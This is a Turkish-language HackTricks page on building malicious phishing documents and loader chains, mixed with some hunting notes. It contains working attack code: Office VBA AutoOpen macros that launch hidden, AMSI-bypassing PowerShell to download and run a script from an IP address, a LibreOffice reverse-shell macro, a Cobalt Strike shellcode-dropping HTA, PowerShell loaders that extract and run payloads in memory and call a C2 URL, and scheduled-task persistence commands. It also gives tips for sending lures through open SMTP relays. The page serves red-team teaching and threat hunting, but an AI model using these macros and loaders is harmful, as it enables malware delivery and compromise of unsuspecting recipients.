# Phishing Dosyaları ve Belgeleri

{{#include ../../banners/hacktricks-training.md}}

## Office Belgeleri

Microsoft Word, bir dosyayı açmadan önce dosya verilerini doğrular. Veri doğrulama, OfficeOpenXML standardına göre veri yapısının tanımlanması biçiminde gerçekleştirilir. Veri yapısı tanımlanırken herhangi bir hata oluşursa analiz edilen dosya açılmaz.

Makro içeren Word dosyaları genellikle `.docm` uzantısını kullanır. Ancak dosya uzantısını değiştirerek dosyayı yeniden adlandırmak ve yine de makrolarının çalışmasını sağlamak mümkündür.\
Örneğin, RTF dosyaları tasarımları gereği makroları desteklemez; ancak DOCM uzantısı RTF olarak değiştirilen bir dosya Microsoft Word tarafından işlenir ve makro çalıştırabilir.\
Aynı dahili yapılar ve mekanizmalar Microsoft Office Suite'in tüm yazılımları (Excel, PowerPoint vb.) için geçerlidir.

Bazı Office programlarının hangi uzantıları çalıştıracağını kontrol etmek için aşağıdaki komutu kullanabilirsiniz:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX dosyaları, makro içeren uzak bir şablona (File –Options –Add-ins –Manage: Templates –Go) başvuruyorsa makroları da “çalıştırabilir”.

### Harici Görsel Yükleme

Şuraya gidin: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture ve **Filename or URL**:_ http://<ip>/whatever

![Office Documents - Harici Görsel Yükleme: Şuraya gidin: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

Bir belge oluşturmak yerine alınmış bir belgeyi analiz etmek için bkz. [VBA makro analizi: gereksiz kod ve UserForm'lar](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).

### Makro Arka Kapısı

Belgeden rastgele kod çalıştırmak için makrolar kullanılabilir.

#### Otomatik yükleme işlevleri

Ne kadar yaygınlarsa, AV'nin bunları algılama olasılığı da o kadar yüksektir.

- AutoOpen()
- Document_Open()

#### Makro Kod Örnekleri

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Metadata'yı manuel olarak kaldırma

**File > Info > Inspect Document > Inspect Document** yolunu izleyerek Document Inspector'ı açın. **Inspect**'e, ardından **Document Properties and Personal Information**'ın yanındaki **Remove All**'a tıklayın.

#### Doc uzantısı

İşiniz bittiğinde **Save as type** açılır menüsünü seçin ve biçimi **`.docx`**'ten Word 97-2003 **`.doc`**'a değiştirin.\
Bunu yapın, çünkü **`.docx` içine macro kaydedemezsiniz** ve macro etkin **`.docm`** uzantısının **kötü bir ünü** vardır (ör. küçük resim simgesinde büyük bir `!` bulunur ve bazı web/e-posta ağ geçitleri bu dosyaları tamamen engeller). Bu nedenle, **eski `.doc` uzantısı en iyi uzlaşmadır**.

#### Kötü Amaçlı Macro Oluşturucuları

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT otomatik çalıştırılan macro'ları (Basic)

LibreOffice Writer belgelerine Basic macro'ları gömülebilir ve macro, **Open Document** olayına bağlanarak dosya açıldığında otomatik olarak çalıştırılabilir (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Basit bir reverse shell macro'su şöyledir:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Dize içindeki çift tırnaklara (`""`) dikkat edin: LibreOffice Basic, gerçek tırnakları kaçırmak için bunları kullanır; bu nedenle `...==""")` ile biten payload'larda hem iç komut hem de Shell argümanı dengeli kalır.

Teslimat ipuçları:

- `.odt` olarak kaydedin ve açıldığında hemen çalışması için makroyu belge olayına bağlayın.
- `swaks` ile e-posta gönderirken `--attach @resume.odt` kullanın (`@` gereklidir; böylece ek olarak dosya adı metni değil, dosyanın baytları gönderilir). Bu, doğrulama yapmadan rastgele `RCPT TO` alıcılarını kabul eden SMTP sunucularını kötüye kullanırken kritik önem taşır.

## HTA Dosyaları

HTA, **HTML ile betik dillerini (VBScript ve JScript gibi) birleştiren** bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve tarayıcının güvenlik modelindeki kısıtlamalar olmadan "tam güvenilir" bir uygulama olarak çalışır.

HTA, **`mshta.exe`** kullanılarak çalıştırılır. Bu dosya genellikle **Internet Explorer ile birlikte yüklenir**; dolayısıyla **`mshta`, IE'ye bağlıdır**. Bu nedenle IE kaldırılmışsa HTA'lar çalıştırılamaz.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## HTML e-postada sahte ek kartları

Bir HTML e-posta, gerçek bir ek içermek yerine sağlayıcının yerel ek önizleme kartını taklit edebilir. Talos, dört Base64 kodlu satır içi PNG MIME parçasından yeniden oluşturulmuş bir Gmail kartı gözlemledi. Görselin tamamı tek bir bağlantı etiketi içine alınmıştı ve `?m=<target-id>` içindeki alıcı değeri, alıcı bazında izlemeyi sağlıyordu. Bağlantı `http://` veya `https://` yerine `//` ile başlıyordu; tarayıcılar protokole göreceli bu biçimi çözümler, ancak yalnızca tam URL'lerle eşleşen URL çıkarıcılar bunu gözden kaçırabilir.<sup>[[11]](#references)</sup>

Analiz sırasında, oluşturulmuş ek listesine güvenmek yerine ham MIME'ı inceleyin. Satır içi görüntü parçalarının görsel kartı nasıl oluşturduğunu yeniden kurun, kartı çevreleyen bağlantı etiketini belirleyin ve URL'leri çıkarmadan önce protokole göreceli `href` değerlerini normalleştirin.<sup>[[11]](#references)</sup>

Zarf/başlık gönderen sahteciliği ve DMARC hizalama testleri için bkz. [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## NTLM Kimlik Doğrulamasını Zorlama

**NTLM kimlik doğrulamasını "uzaktan" zorlamanın** birkaç yolu vardır; örneğin, e-postalara veya kullanıcının erişeceği HTML'e **görünmez görüntüler** ekleyebilirsiniz (HTTP MitM bile olabilir?). Ya da kurbanına, yalnızca **klasörü açarak** kimlik doğrulamayı **tetikleyecek** dosyaların **adresini** gönderebilirsiniz.

**Bu fikirleri ve daha fazlasını aşağıdaki sayfalarda inceleyin:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Yalnızca hash'i veya kimlik doğrulama bilgilerini çalmakla kalmayıp **NTLM relay saldırıları da gerçekleştirebileceğinizi** unutmayın:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loader'ları + ZIP İçine Gömülü Payload'lar (fileless zincir)

Son derece etkili kampanyalar, iki meşru yanıltıcı belge (PDF/DOCX) ve kötü amaçlı bir .lnk içeren ZIP dosyası gönderir. Buradaki numara, gerçek PowerShell loader'ının ZIP'in ham baytlarında benzersiz bir işaretleyiciden sonra saklanması ve .lnk dosyasının bu içeriği çıkarıp tamamen bellekte çalıştırmasıdır.<sup>[[2]](#references)</sup>

.lnk PowerShell tek satırlık komutunun uyguladığı tipik akış:

1) Özgün ZIP'i yaygın konumlarda bulun: Desktop, Downloads, Documents, %TEMP%, %ProgramData% ve geçerli çalışma dizininin üst dizini.
2) ZIP'in baytlarını okuyun ve sabit kodlanmış bir işaretleyici bulun (ör. xFIQCV). İşaretleyiciden sonraki her şey gömülü PowerShell payload'ıdır.
3) ZIP'i %ProgramData% konumuna kopyalayın, oraya çıkarın ve meşru görünmesi için yanıltıcı .docx dosyasını açın.
4) Geçerli işlem için AMSI'yi atlatın: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Sonraki aşamanın gizlemesini kaldırın (ör. tüm # karakterlerini kaldırarak) ve onu bellekte çalıştırın.

Gömülü aşamayı çıkarıp çalıştırmak için örnek PowerShell iskeleti:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Notlar
- Teslimat çoğu zaman saygın PaaS alt alan adlarını (örn. *.herokuapp.com) kötüye kullanır ve payload'ları koşula bağlayabilir (IP/UA'ya göre zararsız ZIP'ler sunar).
- Sonraki aşama, disk üzerindeki izleri en aza indirmek için sıklıkla base64/XOR shellcode'u çözer ve Reflection.Emit + VirtualAlloc aracılığıyla çalıştırır.

Aynı zincirde kullanılan kalıcılık
- Microsoft Web Browser denetiminin COM TypeLib hijacking yöntemiyle ele geçirilmesi; böylece IE/Explorer veya bu denetimi gömen herhangi bir uygulama payload'u otomatik olarak yeniden başlatır.<sup>[[2]](#references)[[4]](#references)</sup> Ayrıntılar ve kullanıma hazır komutlar için buraya bakın:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Avcılık/IOC'ler
- Arşiv verisinin sonuna eklenmiş ASCII işaret dizgesini (örn. xFIQCV) içeren ZIP dosyaları.
- ZIP dosyasını bulmak için üst/ kullanıcı klasörlerini tarayan ve bir yem belge açan .lnk.
- [System.Management.Automation.AmsiUtils]::amsiInitFailed aracılığıyla AMSI'ye müdahale.
- Güvenilir PaaS alan adlarında barındırılan bağlantılarla sonlanan uzun iş yazışmaları.

## LNK önce yem belgeyi açarak aşamalandırma → scheduled-task kalıcılığı → güvenilir CPL side-loading

Tekrarlanan başka bir örüntü, arka planda gerçek zinciri aşamalandırırken zararsız bir yem belgeyi hemen açan **belgeyi taklit eden bir `.lnk`** dosyasıdır.<sup>[[3]](#references)</sup>

Gözlemlenen iş akışı:
1. Kısayol **PDF gibi görünür** ve gizlenmiş bir PowerShell indiricisini başlatmak için `conhost.exe` veya benzer bir proxy kullanır.
2. PowerShell, belirgin belirteçleri (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) parçalara ayırır; böylece `iwr`, `gci`, `ren`, `cpi` veya `schtasks` arayan basit tespit mekanizmaları komutu gözden kaçırır.
3. Aşamalandırıcı önce **yem belgeyi indirir**, kurban için açar ve ardından arka planda kötü amaçlı dosyaları yeniden oluşturur.
4. Payload'lar **uydurma uzantılarla** yazılabilir ve daha sonra dolgu karakterleri kaldırılarak yeniden adlandırılabilir; bu da belirgin `.exe` / `.cpl` dosyalarının ortaya çıkışını geciktirir.
5. Kullanıcının yazabildiği bir yoldan güvenilir bir ana bilgisayar ikilisini başlatan **dakika bazlı bir scheduled task** ile kalıcılık sağlanır.

Bu örüntüye dair temel avcılık ipuçları:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Tanınması faydalı bir hazırlık düzeni:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### İkinci aşama neden gizlidir?

Rapid7 vaka çalışmasında, zamanlanmış görev **`Fondue.exe`** dosyasını tekrar tekrar `C:\Users\Public\` konumundan başlatıyordu. **`APPWIZ.cpl`** dosyası yanına bırakılıp **`RunFODW`** dışa aktarıldığından, güvenilir Microsoft binary’si meşru sistem kopyası yerine saldırganın CPL dosyasını side-load etti.

CPL dosyası:
- `C:\Windows\Tasks\editor.dat` konumundaki bir **AES-256-CBC** blob’unu okur
- Blob’un şifresini **Windows CNG / `bcrypt.dll`** aracılığıyla çözer
- Yürütülebilir bellek ayırıp şifresi çözülmüş shellcode’u kopyalar
- Shellcode işaretçisini **`EnumUILanguagesW`** için callback olarak geçirerek dolaylı biçimde çalıştırır

Bu son adım ayrıca araştırılmaya değer: malware, doğrudan `((void(*)())buf)()` atlamasından kaçınmak için yürütme akışını aktarmada sıklıkla **callback alan meşru bir WinAPI**'yi kötüye kullanır.

Bu kampanyadaki şifresi çözülmüş payload, **Donut** shellcode’uydu. Bu shellcode daha sonra son PE’yi tamamen belleğe eşledi ve yürütmeyi devretmeden önce mevcut process’te **AMSI/WLDP/ETW**'yi patch’ledi. Side-loading ve bellekte çalışan post-processing hakkında ayrıntılı notlar için:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Araştırma için pratik ipuçları:
- `.lnk` dosyasının `powershell.exe` veya `conhost.exe` başlatmasının ardından görünür bir decoy belgesinin açılması.
- `C:\Users\Public\` konumuna yapılan kısa süreli indirmelerin ardından anlamsız uzantılardan hemen yeniden adlandırma yapılması.
- `GoogleErrorReport` gibi sıradan adlara sahip zamanlanmış görevlerin **kullanıcının yazabildiği dizinlerden** çalıştırılması.
- Güvenilir binary’lerin aynı sistem dışı dizindeki **`.cpl` / `.dll`** dosyalarını yüklemesi.
- `C:\Windows\Tasks\` altına yazılan ve ardından side-load edilmiş modül tarafından okunan Base64 metin blob’ları.

## Görsellerde steganografiyle ayrılmış payload’lar (PowerShell stager)

Güncel loader zincirleri, Base64 PowerShell stager’ını çözüp çalıştıran gizlenmiş bir JavaScript/VBS dosyası sunar. Bu stager, düz metin olarak benzersiz başlangıç/bitiş işaretçileri arasına gizlenmiş Base64 kodlu bir .NET DLL içeren bir görseli (çoğunlukla GIF) indirir. Script, bu ayırıcıları arar (gerçek saldırılarda görülen örnekler: «<<sudo_png>> … <<sudo_odt>>>»), aradaki metni çıkarır, Base64’ten byte’lara dönüştürür, assembly’yi belleğe yükler ve bilinen bir giriş metodunu C2 URL’siyle çağırır.<sup>[[5]](#references)</sup>

İş Akışı
- Aşama 1: Arşivlenmiş JS/VBS dropper → içine gömülü Base64’ü çözer → `-nop -w hidden -ep bypass` parametreleriyle PowerShell stager’ını başlatır.
- Aşama 2: PowerShell stager → görseli indirir, işaretçilerle ayrılmış Base64’ü çıkarır, .NET DLL’yi belleğe yükler ve metodunu (ör. VAI) C2 URL’si ile seçenekleri ileterek çağırır.
- Aşama 3: Loader son payload’ı alır ve genellikle process hollowing kullanarak güvenilir bir binary’ye (yaygın olarak MSBuild.exe) inject eder.<sup>[[7]](#references)[[8]](#references)</sup> Process hollowing ve güvenilir yardımcı programlar üzerinden proxy yürütme hakkında daha fazla bilgi için:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Bir görselden DLL çıkarıp .NET metodunu bellekte çağırmaya yönelik PowerShell örneği:

<details>
<summary>PowerShell stego payload çıkarıcı ve loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Notlar
- Bu, ATT&CK T1027.003'tür (steganografi/işaretleyici gizleme).<sup>[[6]](#references)</sup> İşaretleyiciler kampanyalar arasında değişiklik gösterir.
- AMSI/ETW bypass ve string deobfuscation, assembly yüklenmeden önce yaygın olarak uygulanır.
- Tehdit avı: İndirilen görselleri bilinen ayırıcılar için tarayın; görsellere erişip hemen Base64 blob'larını çözen PowerShell işlemlerini belirleyin.

Ayrıca stego araçlarına ve carving tekniklerine bakın:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Yinelenen bir ilk aşama, bir arşiv içinde sunulan küçük ve yoğun biçimde obfuscate edilmiş bir `.js` veya `.vbs` dosyasıdır. Tek amacı, gömülü bir Base64 string'ini çözmek ve HTTPS üzerinden sonraki aşamayı başlatmak için PowerShell'i `-nop -w hidden -ep bypass` seçenekleriyle çalıştırmaktır.<sup>[[5]](#references)</sup>

İskelet mantığı (soyut):
- Kendi dosyasının içeriğini oku
- Gereksiz string'ler arasındaki Base64 blob'unu bul
- ASCII PowerShell'e çöz
- `wscript.exe`/`cscript.exe` ile `powershell.exe` çağırarak çalıştır

Tehdit avı göstergeleri
- Komut satırında `-enc`/`FromBase64String` bulunan `powershell.exe` süreçlerini başlatan arşivlenmiş JS/VBS ekleri.
- Kullanıcı geçici dizinlerinden `powershell.exe -nop -w hidden` başlatan `wscript.exe`.

## Çalıştırma kapsayıcıları olarak MSC belgeleri (GrimResource)

Microsoft Management Console dosyaları (`.msc`), normalde `mmc.exe` ile açılan XML konsol tanımlarıdır. **GrimResource**, eski bir XSS primitive'i içeren `apds.dll` kaynağına yönelik `StringTable` referansını silah olarak kullanır; böylece kullanıcı hazırlanmış konsolu açtığında JavaScript `mmc.exe` içinde çalışır. Gözlemlenen örneklerde, olağan Office-macro yolu kullanılmadan bir .NET payload'u oluşturmak için `transformNode` tabanlı obfuscation ile **DotNetToJScript** birlikte kullanılmıştır.<sup>[[9]](#references)</sup>

Statik triage için güvenilmeyen bir MSC'yi metin olarak ele alın ve üzerine **çift tıklamayın**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Yüksek sinyalli runtime pivot’ları arasında `mmc.exe` dosyasının CLR veya script bileşenlerini yüklemesi, ağ bağlantıları kurması ya da `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` veya beklenmeyen bir çalıştırılabilir dosya başlatması bulunur. Biçim meşru olduğundan, tespitler her MSC dosyasını engellemek yerine **kaynak + şüpheli XML/script içeriği + `mmc.exe` davranışı** ile ilişkilendirilmelidir.<sup>[[9]](#references)</sup>

## PDF/QR yönlendiricileri ve payload gating

Bir PDF'nin yararlı olması için exploit içermesi gerekmez. Yakın tarihli kampanyalar, zararsız görünen bir belgeye **QR kodu veya sıradan bir bağlantı** yerleştiriyor, tarayıcı oturumunu e-posta kontrollerinin dışına taşıyor ve hedefi alıcının adresine göre kişiselleştiriyor. Microsoft, QR URL'lerinin alıcıya özel olduğu ve RaccoonO365 kimlik bilgisi toplama altyapısına yönlendirdiği 2025 tarihli PDF'leri belgeledi; paralel bir zincirde ise IP/ortam filtrelemesi kullanılarak seçili ziyaretçilere bir JavaScript/MSI yolu, tarayıcılara veya izin verilmeyen istemcilere ise zararsız bir PDF sunuldu.<sup>[[10]](#references)</sup>

Hem PDF eylemlerini hem de görüntülenen QR kodlarını inceleyin. QR kodu, çıkarılabilir bir görüntü olarak saklanmak yerine vektörlerle çizilmiş olabilir; bu nedenle gömülü görüntüleri çıkarmanın yanı sıra her sayfayı rasterleştirin:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

İzolasyonlu bir analiz sisteminden, kimlik doğrulaması yapmadan çözümlenen hedefleri ve yönlendirmeleri inceleyin. Yararlı avlanma özellikleri arasında gövdesi neredeyse boş, yalnızca QR kodu içeren PDF'ler; sorgu parametresine gömülü alıcı e-posta adresi; saygın barındırma hizmetleri üzerinden yapılan birden fazla yönlendirme ve IP, coğrafi konum, çerezler, yönlendiren sayfa veya user agent'a göre döndürülen farklı içerikler bulunur. Tek bir sandbox isteği yalnızca yem içeriği alabileceğinden, istekleri kontrollü profillerle karşılaştırın.<sup>[[10]](#references)</sup>

## NTLM hash'lerini çalmak için Windows dosyaları

**NTLM creds çalınabilecek yerler** hakkındaki sayfaya bakın:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Kampanyası: ABD Şirketlerini Hedef Alan Gelişmiş Bir Phishing Saldırısı](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Çin Temalı Bir Loader Zinciri Boyunca Dropping Elephant Taktiklerinin İzlenmesi](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Yeni COM kalıcılık tekniği (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader Çeşitli Infostealer'lar Dağıtıyor](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganografi (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Güvenilir Geliştirici Araçları Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: İlk erişim ve kaçınma için Microsoft Management Console](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Tehdit aktörleri, vergi temalı phishing kampanyaları dağıtmak için vergi sezonundan yararlanıyor](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – UAT-11587 dağıtım zinciri ve Antino backdoor'u](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
{{#include ../../banners/hacktricks-training.md}}
